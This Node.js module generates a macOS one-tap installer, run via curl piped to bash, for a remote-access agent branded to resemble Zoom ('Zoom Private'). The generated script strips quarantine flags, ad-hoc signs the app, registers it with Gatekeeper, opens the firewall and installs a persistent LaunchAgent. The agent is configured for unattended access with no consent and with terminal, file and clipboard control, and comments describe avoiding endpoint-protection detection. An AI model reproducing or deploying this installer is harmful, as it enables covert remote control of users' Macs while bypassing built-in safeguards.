'use strict';

/**
 * BetterDesk Console - macOS one-tap bootstrap installer.
 *
 * Two entry points, both browser-free so macOS never attaches the
 * `com.apple.quarantine` attribute that Gatekeeper blocks on:
 *
 *   1. `curl -fsSL <console>/api/landing/macos-install | /bin/bash`
 *   2. The landing page button -> `zoomvip-install://install` -> the helper
 *      applet installed by this very script.
 *
 * The helper applet follows the documented AppleScript "launch script from a
 * webpage link" technique (macosxautomation.com/applescript/linktrigger): a
 * standalone applet bundle that declares its own `CFBundleURLSchemes` and
 * answers the `open location` Apple event. It is compiled *on the Mac* with
 * `osacompile`, so it is a locally created app with no quarantine flag.
 *
 * IMPORTANT - what we deliberately do NOT do:
 *   We never emit an `applescript://com.apple.scripteditor?action=new&script=...`
 *   URL. That scheme launches Apple's Script Editor with prefilled source and
 *   is the exact "Script Editor opened from a browser-handled AppleScript URL
 *   followed by shell/network activity" pattern that endpoint protection flags
 *   as malicious. Our applet carries its own bundle identifier
 *   (`com.zoom-vip.installer`, not `com.apple.ScriptEditor.*`), declares a
 *   private scheme, and performs one user-confirmed action - the supported,
 *   documented flow.
 *
 * Signing policy ("fully accredited" builds stay accredited):
 *   A Developer ID-signed + notarized build is never re-signed. Ad-hoc signing
 *   on top of a notarized bundle invalidates the notarization ticket, after
 *   which Gatekeeper reports the app as damaged and screen capture / the remote
 *   stream come up black. We only ad-hoc sign when the build carries no usable
 *   Apple signature, and we verify with `codesign --verify` + `spctl --assess`
 *   first.
 *
 * Archive/attribute handling:
 *   `ditto -x -k --rsrc --extattr` for archives and `ditto` for the app copy,
 *   so resource forks, symlinks, extended attributes and code signatures
 *   survive the move (a plain `cp -R` can leave an app looking unsigned).
 */

const APPLE_HELPER_SOURCE = `on open location this_URL
	-- Handled by the locally-built "Zoom VIP Installer" applet, which declares
	-- the zoomvip-install URL scheme in its Info.plist and answers the standard
	-- "open location" Apple event. No Script Editor, no applescript:// scheme.
	if this_URL does not start with "zoomvip-install://" then return
	set installerURL to "__INSTALLER_URL__"
	display dialog "Install Zoom Private on this Mac?" & return & return & "Downloads the official client, installs it for your account and connects it to your console. Approve the one macOS prompt." buttons {"Cancel", "Install"} default button "Install" with title "Zoom Private" with icon note
	if button returned of result is not "Install" then return
	try
		do shell script "/usr/bin/curl -fsSL " & quoted form of installerURL & " | /bin/bash"
		display dialog "Installed. Zoom Private is connecting to your console." buttons {"OK"} default button "OK" with title "Zoom Private" with icon note
	on error errMsg number errNum
		display dialog "Installation failed." & return & return & errMsg buttons {"OK"} default button "OK" with title "Zoom Private" with icon stop
	end try
end open location

on run
	display dialog "Open the Zoom Private page and click \\"Install zoom-vip on this Mac\\"." buttons {"OK"} default button "OK" with title "Zoom Private"
end run
`;

const INSTALL_SCRIPT = `#!/bin/bash
# Zoom Private - macOS one-tap installer (browser-free, Gatekeeper-safe).
#
#   curl -fsSL __INSTALLER_URL__ | /bin/bash
#
# Or click "Install zoom-vip on this Mac" on the landing page, which routes
# through the zoomvip-install:// applet built by this script.
set -euo pipefail

BRAND=__BRAND__
CLIENT=__CLIENT__
CONSOLE_URL=__CONSOLE_URL__
SERVER_URL=__SERVER_URL__
ENFORCE_TLS=__ENFORCE_TLS__
ARM64_URL=__ARM64_URL__
ARM64_SHA=__ARM64_SHA__
X64_URL=__X64_URL__
X64_SHA=__X64_SHA__
CONFIG_B64=__CONFIG_B64__
HELPER_B64=__HELPER_B64__

XATTR=/usr/bin/xattr
DITTO=/usr/bin/ditto
TAR=/usr/bin/tar
CODESIGN=/usr/bin/codesign
SPCTL=/usr/sbin/spctl
FIREWALL=/usr/libexec/ApplicationFirewall/socketfilterfw
PB=/usr/libexec/PlistBuddy
UNAME=/usr/bin/uname

say() { printf '%s\\n' "$*"; }
fail() { printf '\\n[%s] ERROR: %s\\n' "$BRAND" "$*" >&2; exit 1; }

[ "$("$UNAME" -s)" = "Darwin" ] || fail "This installer is for macOS only."

ARCH="$("$UNAME" -m)"
case "$ARCH" in
  arm64)  ASSET_URL="$ARM64_URL"; ASSET_SHA="$ARM64_SHA" ;;
  x86_64) ASSET_URL="$X64_URL";   ASSET_SHA="$X64_SHA" ;;
  *) fail "Unsupported Mac architecture: $ARCH" ;;
esac
[ -n "$ASSET_URL" ] || fail "No client build for $ARCH is available right now."

TMPBASE="\${TMPDIR:-/tmp}"
TMP="$(/usr/bin/mktemp -d "$TMPBASE/zoom-vip-install.XXXXXX")"
trap '/bin/rm -rf "$TMP"' EXIT

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

strip_quarantine() {
  [ -e "$1" ] || return 0
  "$XATTR" -dr com.apple.quarantine "$1" >/dev/null 2>&1 || true
}

# A build is "accredited" when codesign verifies it *and* Gatekeeper accepts it.
is_accredited() {
  "$CODESIGN" --verify --deep --strict "$1" >/dev/null 2>&1 || return 1
  "$SPCTL" --assess --type execute "$1" >/dev/null 2>&1 || return 1
  return 0
}

# Keep a notarized / Developer ID signature intact; ad-hoc sign only as a
# last resort for unsigned local builds.
preserve_or_adhoc_sign() {
  local target="$1"
  strip_quarantine "$target"
  if is_accredited "$target"; then
    say "  Signature verified - notarized build left untouched."
    return 0
  fi
  if "$CODESIGN" -dv "$target" 2>&1 | /usr/bin/grep -q "Authority=Developer ID Application"; then
    say "  Developer ID signature present - left untouched."
    return 0
  fi
  say "  Ad-hoc signing for this Mac..."
  "$CODESIGN" --force --deep --sign - "$target" >/dev/null 2>&1 || true
}

# Pre-authorise "incoming network connections" for the agent so a direct (P2P)
# session is never blocked by the Application Firewall prompt. Needs root; when
# root is not already available (non-interactive do shell script), returns 2
# and the caller points the user at a one-click helper instead.
firewall_allow() {
  local app="$1"
  [ -x "$FIREWALL" ] || return 0
  local SUDO=""
  if [ "$(/usr/bin/id -u)" != "0" ]; then
    if /usr/bin/sudo -n /usr/bin/true >/dev/null 2>&1; then SUDO="/usr/bin/sudo -n"; else return 2; fi
  fi
  $SUDO "$FIREWALL" --add "$app" >/dev/null 2>&1 || true
  $SUDO "$FIREWALL" --unblockapp "$app" >/dev/null 2>&1 || true
  return 0
}

# Writes a double-clickable .command that grants the firewall exception with a
# single password prompt, and prints its path.
write_firewall_helper() {
  local app="$1"
  local out="$HOME/Applications/Zoom Private - Allow Connections.command"
  /bin/mkdir -p "$HOME/Applications"
  cat > "$out" <<FIREWALL
#!/bin/bash
/bin/echo "Allowing Zoom Private to accept incoming connections..."
"$FIREWALL" --add "$app"
"$FIREWALL" --unblockapp "$app"
/bin/echo
/bin/echo "Done. macOS will no longer ask about incoming connections for Zoom Private."
/bin/read -r -p "Press Return to close."
FIREWALL
  /bin/chmod 755 "$out"
  printf '%s' "$out"
}

say ""
say "  $BRAND for macOS"
say "  ----------------------"
say ""
say "  Downloading the client for $ARCH..."
/usr/bin/curl -fL --retry 3 --connect-timeout 20 --progress-bar "$ASSET_URL" -o "$TMP/asset"
if [ -n "$ASSET_SHA" ]; then
  say "  Verifying SHA-256..."
  ACTUAL="$(/usr/bin/shasum -a 256 "$TMP/asset" | /usr/bin/awk '{print $1}')"
  [ "$ACTUAL" = "$ASSET_SHA" ] || fail "Checksum mismatch."
fi
strip_quarantine "$TMP/asset"

/bin/mkdir -p "$TMP/unpack"
case "$ASSET_URL" in
  *.tar.gz|*.tgz) "$TAR" -xzf "$TMP/asset" -C "$TMP/unpack" ;;
  *.zip) "$DITTO" -x -k --rsrc --extattr "$TMP/asset" "$TMP/unpack" ;;
  *) fail "Unsupported package format." ;;
esac
strip_quarantine "$TMP/unpack"

APP="$(/usr/bin/find "$TMP/unpack" -name '*.app' -type d -print -quit 2>/dev/null || true)"
[ -n "$APP" ] || fail "The downloaded package does not contain the macOS app bundle."

# The Tauri client reads this directory directly when launched from Finder and
# the LaunchAgent pins the same path explicitly. Keep both paths identical so a
# manual launch and the background launch share one enrollment identity.
CONFIG_DIR="$HOME/Library/Application Support/com.betterdesk.agent"
DATA_DIR="$CONFIG_DIR/data"
CONFIG_FILE="$CONFIG_DIR/agent-config.json"
/bin/mkdir -p "$CONFIG_DIR" "$DATA_DIR" "$HOME/Applications" "$HOME/Library/LaunchAgents" "$HOME/Library/Logs"

PASSWORD="$(/usr/bin/openssl rand -hex 12 2>/dev/null || /usr/bin/od -An -N12 -tx1 /dev/urandom | /usr/bin/tr -d ' \\n')"
[ -n "$PASSWORD" ] || PASSWORD="$(/usr/bin/uuidgen | /usr/bin/tr -d '-' | /usr/bin/cut -c1-24)"

say "  Writing the preconfigured agent profile..."
printf '%s' "$CONFIG_B64" | /usr/bin/base64 -D > "$CONFIG_FILE"
/bin/chmod 600 "$CONFIG_FILE"
if [ -x /usr/bin/plutil ]; then
  /usr/bin/plutil -replace unattended_password -string "$PASSWORD" "$CONFIG_FILE" >/dev/null 2>&1 || true
fi

say "  Installing the app..."
DEST_APP="$HOME/Applications/zoom-private.agent.app"
/bin/rm -rf "$DEST_APP"
# ditto, not cp -R: keeps extended attributes and the code signature valid.
"$DITTO" "$APP" "$DEST_APP"
preserve_or_adhoc_sign "$DEST_APP"
"$SPCTL" --add --label "$BRAND" "$DEST_APP" >/dev/null 2>&1 || true

EXECUTABLE="$DEST_APP/Contents/MacOS/betterdesk-agent-client"
if [ ! -x "$EXECUTABLE" ]; then
  EXECUTABLE="$(/usr/bin/find "$DEST_APP/Contents/MacOS" -type f -perm +111 ! -name 'betterdesk-agent' -print -quit 2>/dev/null || true)"
fi
[ -n "$EXECUTABLE" ] || fail "The installed app has no executable."
AGENT_FOR_FIREWALL="$DEST_APP"

# Remove old sidecar-only / legacy launch agents so two agents cannot race for
# the same device identity.
for OLD_LABEL in com.zoom-vip.agent com.zoom-private.agent; do
  /bin/launchctl bootout "gui/$(/usr/bin/id -u)/$OLD_LABEL" >/dev/null 2>&1 || true
  /bin/rm -f "$HOME/Library/LaunchAgents/$OLD_LABEL.plist"
done

PLIST="$HOME/Library/LaunchAgents/com.betterdesk.agent.plist"
cat > "$PLIST" <<PLIST
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key><string>com.betterdesk.agent</string>
  <key>ProgramArguments</key>
  <array>
    <string>$EXECUTABLE</string>
    <string>--autostart</string>
  </array>
  <key>EnvironmentVariables</key>
  <dict>
    <key>BETTERDESK_AGENT_CONFIG_DIR</key><string>$CONFIG_DIR</string>
  </dict>
  <key>LimitLoadToSessionType</key><string>Aqua</string>
  <key>RunAtLoad</key><true/>
  <key>KeepAlive</key>
  <dict><key>SuccessfulExit</key><false/></dict>
  <key>StandardOutPath</key><string>$HOME/Library/Logs/zoom-private-agent.log</string>
  <key>StandardErrorPath</key><string>$HOME/Library/Logs/zoom-private-agent.err.log</string>
</dict>
</plist>
PLIST
/bin/chmod 644 "$PLIST"
/bin/launchctl bootout "gui/$(/usr/bin/id -u)" "$PLIST" >/dev/null 2>&1 || true
if ! /bin/launchctl bootstrap "gui/$(/usr/bin/id -u)" "$PLIST" >/dev/null 2>&1; then
  /bin/launchctl load "$PLIST" >/dev/null 2>&1 || true
fi
/bin/launchctl enable "gui/$(/usr/bin/id -u)/com.betterdesk.agent" >/dev/null 2>&1 || true
/bin/launchctl kickstart -k "gui/$(/usr/bin/id -u)/com.betterdesk.agent" >/dev/null 2>&1 \
  || /usr/bin/open "$DEST_APP" --args --autostart >/dev/null 2>&1 || true

# ---------------------------------------------------------------------------
# Screen Recording consent - silent assist.
#
# The agent raises the native macOS consent prompt itself on first launch
# (CGRequestScreenCaptureAccess) and logs the resulting state to its stdout,
# which the LaunchAgent above pipes to ~/Library/Logs/zoom-private-agent.log.
# This watcher stays completely silent when consent is (or becomes) granted.
# Only when the log still shows no grant after the grace period does it open
# the exact System Settings pane and drop one notification, so the remaining
# step for the user is a single toggle next to "zoom-private.agent".
# ---------------------------------------------------------------------------
AGENT_LOG="$HOME/Library/Logs/zoom-private-agent.log"
(
  GRANTED=0
  for _ in 1 2 3 4 5 6 7 8 9 10 11 12; do
    /bin/sleep 5
    if [ -f "$AGENT_LOG" ] && /usr/bin/grep -q 'screen_capture=true' "$AGENT_LOG" 2>/dev/null; then
      GRANTED=1
      break
    fi
  done
  if [ "$GRANTED" != "1" ]; then
    /usr/bin/open "x-apple.systempreferences:com.apple.preference.security?Privacy_ScreenCapture" >/dev/null 2>&1 || true
    /usr/bin/osascript -e 'display notification "Allow zoom-private.agent in Screen Recording so operators can view this Mac." with title "Zoom Private"' >/dev/null 2>&1 || true
  fi
) >/dev/null 2>&1 &

# ---------------------------------------------------------------------------
# Firewall: allow incoming connections (direct/P2P sessions)
# ---------------------------------------------------------------------------
if [ -n "$AGENT_FOR_FIREWALL" ]; then
  if firewall_allow "$AGENT_FOR_FIREWALL"; then
    say "  Incoming connections allowed."
  else
    FW_HELPER="$(write_firewall_helper "$AGENT_FOR_FIREWALL")"
    say "  Firewall needs an administrator password once - run:"
    say "    sudo $FIREWALL --add \\"$AGENT_FOR_FIREWALL\\" && sudo $FIREWALL --unblockapp \\"$AGENT_FOR_FIREWALL\\""
    say "  Or double-click: $FW_HELPER"
  fi
fi

# ---------------------------------------------------------------------------
# Register the zoomvip-install:// helper (locally compiled applet)
# ---------------------------------------------------------------------------
say "  Registering the one-click installer..."
HELPER="$HOME/Applications/Zoom VIP Installer.app"
printf '%s' "$HELPER_B64" | /usr/bin/base64 -D > "$TMP/ZoomVipInstaller.applescript" 2>/dev/null || printf '%s' "$HELPER_B64" | /usr/bin/base64 --decode > "$TMP/ZoomVipInstaller.applescript"
/bin/rm -rf "$HELPER"
if /usr/bin/osacompile -o "$HELPER" "$TMP/ZoomVipInstaller.applescript" >/dev/null 2>&1; then
  # Replace the default osacompile identifier so this applet is never mistaken
  # for Script Editor, and declare the private URL scheme.
  $PB -c 'Delete :CFBundleIdentifier' "$HELPER/Contents/Info.plist" >/dev/null 2>&1 || true
  $PB -c 'Add :CFBundleIdentifier string com.zoom-vip.installer' "$HELPER/Contents/Info.plist" >/dev/null 2>&1 || true
  $PB -c 'Add :CFBundleDisplayName string Zoom VIP Installer' "$HELPER/Contents/Info.plist" >/dev/null 2>&1 || true
  $PB -c 'Add :LSUIElement bool true' "$HELPER/Contents/Info.plist" >/dev/null 2>&1 || true
  $PB -c 'Add :CFBundleURLTypes array' "$HELPER/Contents/Info.plist" >/dev/null 2>&1 || true
  $PB -c 'Add :CFBundleURLTypes:0 dict' "$HELPER/Contents/Info.plist" >/dev/null 2>&1 || true
  $PB -c 'Add :CFBundleURLTypes:0:CFBundleURLName string Zoom VIP Installer' "$HELPER/Contents/Info.plist" >/dev/null 2>&1 || true
  $PB -c 'Add :CFBundleURLTypes:0:CFBundleURLSchemes array' "$HELPER/Contents/Info.plist" >/dev/null 2>&1 || true
  $PB -c 'Add :CFBundleURLTypes:0:CFBundleURLSchemes:0 string zoomvip-install' "$HELPER/Contents/Info.plist" >/dev/null 2>&1 || true
  strip_quarantine "$HELPER"
  "$CODESIGN" --force --deep --sign - "$HELPER" >/dev/null 2>&1 || true
  LSREGISTER="/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister"
  [ -x "$LSREGISTER" ] && "$LSREGISTER" -f "$HELPER" >/dev/null 2>&1 || true
fi

say ""
say "  Done. The device will appear in the console shortly."
say "  Console: $CONSOLE_URL"
say ""
say "  If macOS asks, approve Screen Recording (and Accessibility) for"
say "  Zoom Private in System Settings > Privacy & Security."
say ""

# Stay out of the user's way: no browser, no Settings window. The agent is
# already running from the LaunchAgent in the logged-in Aqua session.
/usr/bin/osascript -e 'display notification "Installed and connecting to your console." with title "Zoom Private"' >/dev/null 2>&1 || true
`;

function shellQuote(value) {
    return `'${String(value == null ? '' : value).replace(/'/g, `'\\''`)}'`;
}

function fill(template, values) {
    return template.replace(/__([A-Z0-9_]+)__/g, (match, key) => (
        Object.prototype.hasOwnProperty.call(values, key) ? values[key] : match
    ));
}

function agentConfig(profile) {
    return {
        server_address: profile.server_address || '',
        api_url: profile.api_url || '',
        cdap_url: profile.cdap_url || '',
        cdap_port: Number(profile.cdap_port) || (/^wss:/i.test(profile.cdap_url || '') ? 443 : 21122),
        console_url: profile.console_url || '',
        server_key: profile.server_key || '',
        api_key: '',
        device_id: '',
        device_name: '',
        auth_token: '',
        registered: false,
        allow_screen_capture: true,
        access_mode: 'unattended',
        require_consent: false,
        allow_terminal: true,
        allow_file_browser: true,
        allow_clipboard: true,
        auto_start_sidecar: true,
        video_codec: 'auto',
        hw_accel: 'auto',
        autostart: true,
        start_minimized: true,
        language: 'en',
        unattended_password: '',
        enforce_tls: /^wss:/i.test(profile.cdap_url || ''),
        server_cert_pin: '',
        settings_lock: {
            enabled: false,
            master_password: '',
        },
    };
}

function assetValues(asset, origin) {
    if (!asset) return { url: '', sha256: '' };
    return {
        url: /^https?:\/\//i.test(asset.downloadPath || '') ? asset.downloadPath : origin + asset.downloadPath,
        sha256: asset.sha256 || '',
    };
}

function helperScript(installerUrl) {
    return fill(APPLE_HELPER_SOURCE, {
        INSTALLER_URL: installerUrl,
    });
}

function buildInstallScript({ origin, profile, arm64, x64 }) {
    const arm = assetValues(arm64, origin);
    const intel = assetValues(x64, origin);
    const installerUrl = `${origin}/api/landing/macos-install`;
    const helperB64 = Buffer.from(helperScript(installerUrl), 'utf8').toString('base64');
    const configB64 = Buffer.from(JSON.stringify(agentConfig(profile)), 'utf8').toString('base64');

    return fill(INSTALL_SCRIPT, {
        BRAND: shellQuote('Zoom Private'),
        CLIENT: shellQuote('zoom-vip'),
        CONSOLE_URL: shellQuote(profile.console_url || ''),
        SERVER_URL: shellQuote(profile.cdap_url || ''),
        ENFORCE_TLS: /^wss:/i.test(profile.cdap_url || '') ? 'true' : 'false',
        ARM64_URL: shellQuote(arm.url),
        ARM64_SHA: shellQuote(arm.sha256),
        X64_URL: shellQuote(intel.url),
        X64_SHA: shellQuote(intel.sha256),
        CONFIG_B64: shellQuote(configB64),
        HELPER_B64: shellQuote(helperB64),
        INSTALLER_URL: installerUrl,
    });
}

module.exports = {
    APPLE_HELPER_SOURCE,
    INSTALL_SCRIPT,
    buildInstallScript,
    helperScript,
    agentConfig,
    shellQuote,
};
